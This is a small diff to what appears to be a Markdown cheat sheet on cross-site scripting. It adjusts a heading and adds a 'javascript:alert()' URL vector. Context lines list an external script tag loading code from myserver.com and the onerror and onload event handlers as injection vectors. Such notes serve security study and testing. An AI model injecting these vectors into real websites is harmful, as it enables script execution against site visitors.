@@ -15,7 +15,7 @@
 
 * [External Script] <script src=https://myserver.com/jsthegreat.js></script>
 
-## With event handlers:
+### With event handlers:
 
 * With or Without user interaction
   
@@ -26,7 +26,10 @@
    > Wihtout User Interaction
    * onerror 
    * onload
-  
+ 
+### In URL:
+
+* javascript:alert()  
 
 ## Methodology:
 
